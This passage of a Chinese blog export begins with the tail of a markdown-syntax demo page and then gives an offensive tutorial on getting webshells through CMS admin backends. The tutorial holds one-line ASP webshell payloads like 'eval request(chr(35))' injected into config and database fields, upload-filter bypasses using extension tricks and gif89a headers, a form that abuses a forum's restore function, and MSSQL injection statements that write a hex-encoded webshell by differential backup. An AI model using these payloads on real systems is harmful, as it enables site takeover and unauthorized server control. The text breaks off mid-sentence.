class="headerlink" title="自定义class"></a>自定义class</h2><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token title important"><span class="token punctuation">##</span> 自定义class {class名称}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过自定义的class名称后，你就可以在每篇文章的自定义css里添加自己想要的样式了．</p><h2 id="cjk强调"><a href="#cjk强调" class="headerlink" title="cjk强调"></a>cjk强调</h2><pre class="line-numbers language-markdown"><code class="language-markdown"><span class="token italic"><span class="token punctuation">_</span>这里将显示带有衬线字体效果的中文做为强调<span class="token punctuation">_</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="cjk注音标示"><a href="#cjk注音标示" class="headerlink" title="cjk注音标示"></a>cjk注音标示</h2><pre class="line-numbers language-markdown"><code class="language-markdown">{需要被注音标示的内容}(注音标示){需要被注音标示的内容}[编号]<span class="token url-reference url"><span class="token punctuation">[</span><span class="token variable">编号</span><span class="token punctuation">]</span><span class="token punctuation">:</span> 注音标示</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="居中显示文字"><a href="#居中显示文字" class="headerlink" title="居中显示文字"></a>居中显示文字</h2><pre class="line-numbers language-markdown"><code class="language-markdown">->居中显示的文字&lt;-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="对齐显示文字"><a href="#对齐显示文字" class="headerlink" title="对齐显示文字"></a>对齐显示文字</h2><pre class="line-numbers language-markdown"><code class="language-markdown">:>居左显示的文字<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>-</span><span class="token attr-name">-</span><span class="token punctuation">></span></span>居右显示的文字<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>:</span><span class="token attr-name">:</span><span class="token punctuation">></span></span>两端对齐显示的文字<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>:</span><span class="token attr-name">-</span><span class="token punctuation">></span></span>居中显示的文字&lt;-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注： 该语法与center语法冲突，两种语法同时开启时，align语法将覆盖center语法。</p><hr><hr><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><hr><p>[toc]</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="./jianzhu.jpg" alt="箭竹"></p><p><a href="http://www.github.com/suziwen/markdownxiaoshujiang" target="_blank" rel="noopener">http://www.github.com/suziwen/markdownxiaoshujiang</a><br><a href="http://www.xiaoshujiang.com" target="_blank" rel="noopener">http://www.xiaoshujiang.com</a></p><h1 id="这是-H1-一s级标题"><a href="#这是-H1-一s级标题" class="headerlink" title="这是 H1 一s级标题"></a>这是 H1 一s级标题</h1><h2 id="这是-H2-二级标题"><a href="#这是-H2-二级标题" class="headerlink" title="这是 H2 二级标题"></a>这是 H2 二级标题</h2><h3 id="这是-H3-三级标题"><a href="#这是-H3-三级标题" class="headerlink" title="这是 H3 三级标题"></a>这是 H3 三级标题</h3><h4 id="这是-H4-四级标题"><a href="#这是-H4-四级标题" class="headerlink" title="这是 H4 四级标题"></a>这是 H4 四级标题</h4><h5 id="这是-H5-五级标题"><a href="#这是-H5-五级标题" class="headerlink" title="这是 H5 五级标题"></a>这是 H5 五级标题</h5><h6 id="这是-H6-六级标题"><a href="#这是-H6-六级标题" class="headerlink" title="这是 H6 六级标题"></a>这是 H6 六级标题</h6><h3 id="视频-1"><a href="#视频-1" class="headerlink" title="视频"></a>视频</h3><p>%<a href="http://markdown.xiaoshujiang.com/media/movie.ogg" target="_blank" rel="noopener">电影</a></p><h3 id="音频-1"><a href="#音频-1" class="headerlink" title="音频"></a>音频</h3><p>~<a href="http://markdown.xiaoshujiang.com/media/horse.ogg" target="_blank" rel="noopener">音乐</a></p><h3 id="附件-1"><a href="#附件-1" class="headerlink" title="附件"></a>附件</h3><p>=<a href="./jianzhu.jpg">附件</a></p><h3 id="待办事项-1"><a href="#待办事项-1" class="headerlink" title="待办事项"></a>待办事项</h3><ul><li><input disabled="" type="checkbox"> 未完成事项</li><li><input checked="" disabled="" type="checkbox"> 完成事项</li><li><input checked="" disabled="" type="checkbox"> 完成事项</li></ul><h3 id="缩写定义-1"><a href="#缩写定义-1" class="headerlink" title="缩写定义"></a>缩写定义</h3><p>The HTML specification<br>is maintained by the W3C.</p><p>*[HTML]: Hyper Text Markup Language<br>*[W3C]:  World Wide Web Consortium</p><h3 id="印刷字替换-1"><a href="#印刷字替换-1" class="headerlink" title="印刷字替换"></a>印刷字替换</h3><p>(c) (C) (r) (R) (tm) (TM) (p) (P) +-</p><h3 id="html代码"><a href="#html代码" class="headerlink" title="html代码"></a>html代码</h3><div>html代码</div><h3 id="流程图-语法-1"><a href="#流程图-语法-1" class="headerlink" title="流程图 (语法)"></a>流程图 (<a href="http://adrai.github.io/flowchart.js/" target="_blank" rel="noopener">语法</a>)</h3><pre class="line-numbers language-flow"><code class="language-flow">st=>start: 开始e=>end: 结束op=>operation: 操作步骤cond=>condition: 是 或者 否?st->op->condcond(yes)->econd(no)->op<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="序列图-语法-1"><a href="#序列图-语法-1" class="headerlink" title="序列图 (语法)"></a>序列图 (<a href="https://github.com/bramp/js-sequence-diagrams/blob/master/src/grammar.jison" target="_blank" rel="noopener">语法</a>)</h3><pre class="line-numbers language-sequence"><code class="language-sequence">小明->小李: 你好 小李, 最近怎么样?Note right of 小李: 小李想了想小李-->小明: 还是老样子<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="脚注-1x"><a href="#脚注-1x" class="headerlink" title="脚注^1x"></a>脚注<a href="脚注的用法">^1x</a></h3><h3 id="表格Tables"><a href="#表格Tables" class="headerlink" title="表格Tables"></a>表格Tables</h3><table><thead><tr><th>First Header</th><th>Second Header</th></tr></thead><tbody><tr><td>Content Cell</td><td>Content Cell</td></tr><tr><td>Content Cell</td><td>Content Cell</td></tr></tbody></table><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><dl><dt>苹果<br>: 一种水果</dt><dd>一种品牌，计算机，手持设备</dd></dl><dl><dt>桔子</dt><dd>一种水果</dd></dl><h3 id="文字格式-1"><a href="#文字格式-1" class="headerlink" title="文字格式"></a>文字格式</h3><p><strong>这是文字粗体格式</strong></p><p><strong>这是文字粗体格式</strong></p><p><em>这是文字斜体格式</em></p><p><em>这是文字斜体格式</em></p><p><del>在文字上添加删除线</del></p><p>++插入的文字++</p><p>==被记号的文字==</p><p>上角文字: 19^th^</p><p>下角文字: H<del>2</del>O</p><h3 id="无序列表-1"><a href="#无序列表-1" class="headerlink" title="无序列表"></a>无序列表</h3><ul><li>项目1<ul><li>子项目1.1</li><li>子项目1.2<ul><li>子项目1.2.1</li></ul></li></ul></li><li>项目2</li><li>项目3</li></ul><h3 id="有序列表-1"><a href="#有序列表-1" class="headerlink" title="有序列表"></a>有序列表</h3><ol><li>项目1</li><li>项目2</li><li>项目3<ol><li>项目3.1</li><li>项目3.2</li></ol></li></ol><h3 id="有序列表起始编号-1"><a href="#有序列表起始编号-1" class="headerlink" title="有序列表起始编号"></a>有序列表起始编号</h3><ol start="58"><li>项目5</li><li>项目6</li></ol><h3 id="图片-1"><a href="#图片-1" class="headerlink" title="图片"></a>图片</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://xiaoshujiang.com/favicon.ico" alt="图片名称"><br>链接</p><p><a href="http://xiaoshujiang.com" target="_blank" rel="noopener">链接名称</a></p><h3 id="引用-1"><a href="#引用-1" class="headerlink" title="引用"></a>引用</h3><blockquote><p>第一行引用文字<br>第二行引用文字</p></blockquote><h3 id="水平线-1"><a href="#水平线-1" class="headerlink" title="水平线"></a>水平线</h3><hr><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><h4 id="行内代码-1"><a href="#行内代码-1" class="headerlink" title="行内代码"></a>行内代码</h4><p><code>var x = "hello world"</code></p><h4 id="块代码-1"><a href="#块代码-1" class="headerlink" title="块代码"></a>块代码</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * @author John Smith &lt;john.smith@example.com> * @version 1.0*/</span><span class="token keyword">package</span> l2f<span class="token punctuation">.</span>gameserver<span class="token punctuation">.</span>model<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token operator">>></span><span class="token operator">++</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token operator">++</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">;</span><span class="token operator">>></span><span class="token operator">~</span><span class="token operator">~</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">L2Character</span> <span class="token punctuation">{</span><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">&lt;&lt;</span><span class="token operator">>></span><span class="token operator">++</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">L2Character</span> <span class="token keyword">extends</span> <span class="token class-name">L2Object</span> <span class="token punctuation">{</span><span class="token operator">++</span><span class="token operator">&lt;&lt;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> Short ABNORMAL_EFFECT_BLEEDING <span class="token operator">=</span> 0x0_0_0_1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// not sure</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">moveTo</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">{</span>    _ai <span class="token operator">=</span> null<span class="token punctuation">;</span>    _log<span class="token punctuation">.</span><span class="token function">warning</span><span class="token punctuation">(</span><span class="token string">"Should not be called"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/** Task of AI notification */</span>  <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span> <span class="token punctuation">{</span> <span class="token string">"nls"</span><span class="token punctuation">,</span> <span class="token string">"unqualified-field-access"</span><span class="token punctuation">,</span> <span class="token string">"boxing"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token operator">>>=</span><span class="token operator">=</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NotifyAITask</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> CtrlEvent _evt<span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>String<span class="token operator">></span> mList<span class="token operator">==</span><span class="token operator">&lt;&lt;</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token function">getAI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">notifyEvent</span><span class="token punctuation">(</span>_evt<span class="token punctuation">,</span> _evt<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>        t<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="块代码内文字格式-1"><a href="#块代码内文字格式-1" class="headerlink" title="块代码内文字格式"></a>块代码内文字格式</h2><h3 id="块代码高亮标记-1"><a href="#块代码高亮标记-1" class="headerlink" title="块代码高亮标记"></a>块代码高亮标记</h3><pre class="line-numbers language-javascript"><code class="language-javascript">  <span class="token keyword">var</span> <span class="token operator">></span><span class="token operator">>=</span><span class="token operator">=</span>hello<span class="token operator">==</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token operator">=</span> <span class="token string">'hello world'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="块代码删除线-1"><a href="#块代码删除线-1" class="headerlink" title="块代码删除线"></a>块代码删除线</h3><pre class="line-numbers language-javascript"><code class="language-javascript">  <span class="token keyword">var</span> <span class="token operator">></span><span class="token operator">></span><span class="token operator">~</span><span class="token operator">~</span>hello<span class="token operator">~</span><span class="token operator">~</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token operator">=</span> <span class="token string">'hello world'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="块代码加粗-1"><a href="#块代码加粗-1" class="headerlink" title="块代码加粗"></a>块代码加粗</h3><pre class="line-numbers language-javascript"><code class="language-javascript">  <span class="token keyword">var</span> <span class="token operator">></span><span class="token operator">></span><span class="token operator">**</span>hello<span class="token operator">**</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token operator">=</span> <span class="token string">'hello world'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="块代码下横线-1"><a href="#块代码下横线-1" class="headerlink" title="块代码下横线"></a>块代码下横线</h3><pre class="line-numbers language-javascript"><code class="language-javascript">  <span class="token keyword">var</span> <span class="token operator">></span><span class="token operator">></span><span class="token operator">++</span>hello<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token operator">=</span> <span class="token string">'hello world'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="显示行号"><a href="#显示行号" class="headerlink" title="显示行号"></a>显示行号</h3><pre class="line-numbers language-javascript?linenums"><code class="language-javascript?linenums">var x = 1;var z = 'str';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="高亮指定行"><a href="#高亮指定行" class="headerlink" title="高亮指定行"></a>高亮指定行</h3><pre class="line-numbers language-javascript?linenums&amp;fancy=1,3,5"><code class="language-javascript?linenums&amp;fancy=1,3,5">var x = 1;var y = 2;var z = 3;var u = 4;var w = 5;var a = 6;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="显示行号并从指定行数计数"><a href="#显示行号并从指定行数计数" class="headerlink" title="显示行号并从指定行数计数"></a>显示行号并从指定行数计数</h3><pre class="line-numbers language-javascript?linenums=10"><code class="language-javascript?linenums=10">var x = 1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="禁用显示行号"><a href="#禁用显示行号" class="headerlink" title="禁用显示行号"></a>禁用显示行号</h3><pre class="line-numbers language-javascript?linenums=false"><code class="language-javascript?linenums=false">var x = 1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="公式-1"><a href="#公式-1" class="headerlink" title="公式"></a>公式</h3><h4 id="行内公式-1"><a href="#行内公式-1" class="headerlink" title="行内公式"></a>行内公式</h4><p>这是行内公式<code>!$ \Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt\,. $</code></p><h4 id="块公式-1"><a href="#块公式-1" class="headerlink" title="块公式"></a>块公式</h4><pre class="line-numbers language-mathjax!"><code class="language-mathjax!">$$\Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt\,.$$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="带编号的公式"><a href="#带编号的公式" class="headerlink" title="带编号的公式"></a>带编号的公式</h4><p><code>!$\eqref{ref1}$</code></p><pre class="line-numbers language-mathjax!"><code class="language-mathjax!">\begin{equation}\int_0^\infty \frac{x^22}{e^x-1}\,dx = \frac{\pi^4}{15}\label{ref1}\end{equation}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>!$\eqref{ref1}$</code></p><h3 id="统计图"><a href="#统计图" class="headerlink" title="统计图"></a>统计图</h3><pre class="line-numbers language-plot!"><code class="language-plot!">{"data": [ [[0, 0], [1, 1]] ],"options": { "yaxis": { "max": 1 } }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mermaid流程图，序列图，甘特图"><a href="#mermaid流程图，序列图，甘特图" class="headerlink" title="mermaid流程图，序列图，甘特图"></a>mermaid流程图，序列图，甘特图</h3><h4 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h4><pre class="line-numbers language-mermaid!"><code class="language-mermaid!">graph TD;    A-->B;    A-->C;    B-->D;    C-->D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="序列图"><a href="#序列图" class="headerlink" title="序列图"></a>序列图</h4><pre class="line-numbers language-mermaid!"><code class="language-mermaid!">sequenceDiagramA->> B: QueryB->> C: Forward queryNote right of C: Thinking...C->> B: ResponseB->> A: Forward response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="甘特图"><a href="#甘特图" class="headerlink" title="甘特图"></a>甘特图</h4><pre class="line-numbers language-mermaid!"><code class="language-mermaid!">gantt        dateFormat  YYYY-MM-DD        title Adding GANTT diagram functionality to mermaid        section A section        Completed task            :done,    des1, 2014-01-06,2014-01-08        Active task               :active,  des2, 2014-01-09, 3d        Future task               :         des3, after des2, 5d        Future task2               :         des4, after des3, 5d        section Critical tasks        Completed task in the critical line :crit, done, 2014-01-06,24h        Implement parser and jison          :crit, done, after des1, 2d        Create tests for parser             :crit, active, 3d        Future task in critical line        :crit, 5d        Create tests for renderer           :2d        Add to mermaid                      :1d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PPT语法"><a href="#PPT语法" class="headerlink" title="PPT语法"></a>PPT语法</h3><p>使用</p><pre><code> ----</code></pre><p>作为一个水平页分割线，注意在<code>----</code>前后都需要空一行</p><p>使用</p><pre><code> --</code></pre><p>作为一个垂直页分割线, 注意在<code>--</code>前后都需要空一行</p><p>通过如下形式</p><pre><code>&lt;!-- .element: class="fragment" data-fragment-index="1" --&gt;</code></pre><p>可以实现fragment显示效果</p><p>注：　在演示文档模式下，<code>toc</code>和脚注语法将失效.</p><h3 id="emoji表情语法"><a href="#emoji表情语法" class="headerlink" title="emoji表情语法"></a>emoji表情<a href="https://github.com/twitter/twemoji" target="_blank" rel="noopener">语法</a></h3><blockquote><p>Classic markup: <span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f609.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f609.png?v8">😉</span> :crush: <span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span> :tear: <span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">😆</span> <span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f60b.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60b.png?v8">😋</span></p><p>Shortcuts (emoticons): :-) :-( 8-) ;)</p></blockquote><h3 id="自定义class-1"><a href="#自定义class-1" class="headerlink" title="自定义class"></a>自定义class</h3><h4 id="自定义class用例-green"><a href="#自定义class用例-green" class="headerlink" title="自定义class用例{green}"></a>自定义class用例{green}</h4><p>你可以通过查看生成的html代码里，在h4里找到名为<code>green</code>的class名称．</p><h3 id="cjk强调-1"><a href="#cjk强调-1" class="headerlink" title="cjk强调"></a>cjk强调</h3><h4 id="这里将显示中文衬线字体做为强调样式"><a href="#这里将显示中文衬线字体做为强调样式" class="headerlink" title="这里将显示中文衬线字体做为强调样式"></a><em>这里将显示中文衬线字体做为强调样式</em></h4><h3 id="cjk注音标示-1"><a href="#cjk注音标示-1" class="headerlink" title="cjk注音标示"></a>cjk注音标示</h3><p>{小}(xiao){书}(shu){匠}(jiang)</p><h3 id="居中显示"><a href="#居中显示" class="headerlink" title="居中显示"></a>居中显示</h3><p>-&gt;居中显示的{文字}(wenzi)&lt;-</p><p>-&gt;<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="./jianzhu.jpg" alt="箭竹">&lt;-</p><h3 id="文字对齐"><a href="#文字对齐" class="headerlink" title="文字对齐"></a>文字对齐</h3><p>:&gt;居左显示的文字&lt;-</p><p>-&gt;居右显示的文字&lt;:</p><p>:&gt;两端对齐显示的文字&lt;:</p><p>-&gt;居中显示的文字&lt;-</p><h3 id="增强型表格-1"><a href="#增强型表格-1" class="headerlink" title="增强型表格"></a>增强型表格</h3><p>|First Header  | Second Header ||<br>|First Header  | Second Header | Third Header|<br>|————- | ————-|————-|<br>表身1Content Cell  | Merge Content Cell||<br>Content Cell  | Content Cell| Content Cell|</p><p>表身2Content Cell  | Merge Content Cell||<br>Content Cell  | Content Cell| Content Cell|<br>[表格标题]</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><a href="storywriter/upgrade_log">小书匠更新手册</a><br><a href="storywriter/grammar">小书匠语法手册</a><br><a href="storywriter/tutorial">小书匠使用手册</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 小书匠测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
            <tag> 模板 </tag>
            
            <tag> 小书匠 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后台拿webshell的常用方法总结</title>
      <link href="/posts/24292e4b.html"/>
      <url>/posts/24292e4b.html</url>
      
        <content type="html"><![CDATA[<h2 id="后台拿webshell的常用方法总结"><a href="#后台拿webshell的常用方法总结" class="headerlink" title="后台拿webshell的常用方法总结"></a><strong>后台拿webshell的常用方法总结</strong></h2><p><strong>一、直接上传获得webshell</strong> </p><p>这种对php和jsp的一些程序比较常见，MolyX BOARD就是其中一例，直接在心情图标管理上传.php类型，虽然没有提示，其实已经成功了，上传的文 件url应该是<a href="http://forums/images/smiles/下，前一阵子的联众游戏站和网易的jsp系统漏洞就可以直接上传jsp文件。文件名是原来的文件名，bo-blog后台可以可以直接上传.php文件，上传的文件路径有提示。以及一年前十分流行的upfile.asp漏洞(动网5.0和6.0、早期的许多整站系统)，因过滤上传文件不严，导致用户可以直接上传webshell到网站任意可写目录中，从而拿到网站的管理员控制权限。" target="_blank" rel="noopener">http://forums/images/smiles/下，前一阵子的联众游戏站和网易的jsp系统漏洞就可以直接上传jsp文件。文件名是原来的文件名，bo-blog后台可以可以直接上传.php文件，上传的文件路径有提示。以及一年前十分流行的upfile.asp漏洞(动网5.0和6.0、早期的许多整站系统)，因过滤上传文件不严，导致用户可以直接上传webshell到网站任意可写目录中，从而拿到网站的管理员控制权限。</a></p><p><strong>二、添加修改上传类型</strong></p><p>现在很多的脚本程序上传模块不是只允许上传合法文件类型，而大多数的系统是允许添加上传类型，bbsxp后台可以添加asa|asP类型，ewebeditor的后台也可添加asa类型,通过修改后我们可以直接上传asa后缀的webshell了,还有一种情况是过滤了.asp，可以添加.aspasp的文件类型来上传获得webshell。php系统的后台，我们可以添加.php.g1f的上传类型，这是php的一个特性,最后的哪个只要不是已知的文件类型即可，php会将php.g1f作为.php来正常运行,从而也可成功拿到shell。LeadBbs3.14后台获得webshell方法是：在上传类型中增加asp ，注意，asp后面是有个空格的，然后在前台上传ASP马，当然也要在后面加个空格！</p><p><strong>三、利用后台管理功能写入webshell</strong></p><p>上传漏洞基本上补的也差不多了,所以我们进入后台后还可以通过修改相关文件来写入webshell。比较的典型的有dvbbs6.0，还有leadbbs2.88等，直接在后台修改配置文件，写入后缀是asp的文件。而LeadBbs3.14后台获得webshell另一方法是：添加一个新的友情链接，在网站名称处写上冰狐最小马即可,最小马前后要随便输入一些字符，http:\网站\inc\IncHtm\BoardLink.asp就是我们想要的shell。</p><p><strong>四、利用后台管理向配置文件写webshell</strong></p><p>利用””””:””//“等符号构造最小马写入程序的配置文件，joekoe论坛，某某同学录，沸腾展望新闻系统，COCOON Counter统计程序等等，还有很多php程序都可以，COCOON Counter统计程序举例，在管理邮箱处添上cnhacker at 263 dot net”:eval request(chr (35))//, 在配制文件中就是webmail=”cnhacker at 263 dot net":eval request(chr(35))//“，还有一种方法就是写上</p><p>cnhacker at 263 dot net”%&gt;&lt;%eval request(chr(35))%&gt;&lt;%’，这样就会形成前后对应，最小马也就运行了。&lt;%eval request(chr(35))%&gt;可以用lake2的eval发送端以及最新的2006 客户端来连，需要说明的是数据库插马时候要选前者。再如动易2005，到文章中心管理-顶部菜单设置-菜单其它特效，插入一句话马”%&gt;&lt;%execute request(“l”)%&gt;&lt;%’，保存顶部栏目菜单参数设置成功后，我们就得到马地址http://网站/admin/rootclass_menu_config.asp。</p><p><strong>五、利用后台数据库备份及恢复获得webshell</strong></p><p>主要是利用后台对access数据库的“备份数据库”或“恢复数据库”功能，“备份的数据库路径”等变量没有过滤导致可以把任意文件后缀改 为asp，从而得到webshell，msssql版的程序就直接应用了access版的代码，导致sql版照样可以利用。还可以备份网站asp文件为其他后缀 如.txt文件，从而可以查看并获得网页源代码，并获得更多的程序信息增加获得webshell的机会。在实际运用中经常会碰到没有上传功能的时 候，但是有asp系统在运行，利用此方法来查看源代码来获得其数据库的位置，为数据库插马来创造机会，动网论坛就有一个ip地址的数据库，在后台的ip管理中可以插入最小马然后备份成.asp文件即可。在谈谈突破上传检测的方法，很多asp程序在即使改了后缀名后也会提示文件非法，通过在.asp文件头加上gif89a修改后缀为gif来骗过asp程序检测达到上传的目的，还有一种就是用记事本打开图片文件，随便粘贴一部分复制到asp木马文件头，修改gif后缀后上传也可以突破检测，然后备份为.asp文件，成功得到webshell。</p><p><strong>六、利用数据库压缩功能</strong></p><p>可以将数据的防下载失效从而使插入数据库的最小马成功运行，比较典型的就是loveyuki的L-BLOG，在友情添加的url出写上&lt;%eval request (chr(35))%&gt;, 提交后，在数据库操作中压缩数据库，可以成功压缩出.asp文件，用海洋的最小马的eval客户端连就得到一个webshell。</p><p><strong>七、asp+mssql系统</strong></p><p>这里需要提一点动网mssql版，但是可以直接本地提交来备份的。首先在发帖那上传一个写有asp代码的假图片，然后记住其上传路径。写一个本地提交的表单，代码如下：</p><form action="http://网站/bbs/admin_data.asp?action=RestoreData&amp;act=Restore" method="post"><p>已上传文件的位置：<input name="Dbpath" type="text" size="80"></p><p>要复制到的位置：<input name="backpath" type="text" size="80"></p><p><input type="submit" value="提交"></p> </form><p>另存为.htm本地执行。把假图片上传路径填在“已上传文件的位置”那里，想要备份的WebShell的相对路径填写在“要复制到的位置”那里，提交就得到我们可爱的WebShell了，恢复代码和此类似，修改相关地方就可以了。没有遇到过后台执行mssql命令比较强大的asp程序后台，动网的数据库还原和备份是个摆设，不能执行sql命令备份webshell，只能执行一些简单的查询命令。可以利用mssql注入差异备份webshell，一般后台是显示了绝对路径，只要有了注入点基本上就可以差异备份成功。下面是差异备份的主要语句代码，利用动网7.0的注入漏洞可以用差异备份一个webshell，可以用利用上面提到的方法，将conn.asp文件备份成.txt文件而获得库名。<br>差异备份的主要代码：</p><p>;declare at a sysname,@s varchar(4000) select @a=db_name(),@s=0x626273 backup database @a to disk=@s–</p><p>;Drop table [heige];create table [dbo] dot [heige] ([cmd] [image])–</p><p>;insert into heige(cmd) values(0x3C2565786563757465207265717565737428226C2229253E)–</p><p>;declare at a sysname,@s varchar(4000) select @a=db_name(),@s=0x643A5C7765625C312E617370 backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT–</p><p>这段代码中，0x626273是要备份的库名bbs的十六进制，可以是其他名字比如bbs.bak; 0x3C2565786563757465207265717565737428226C2229253E是&lt;%execute 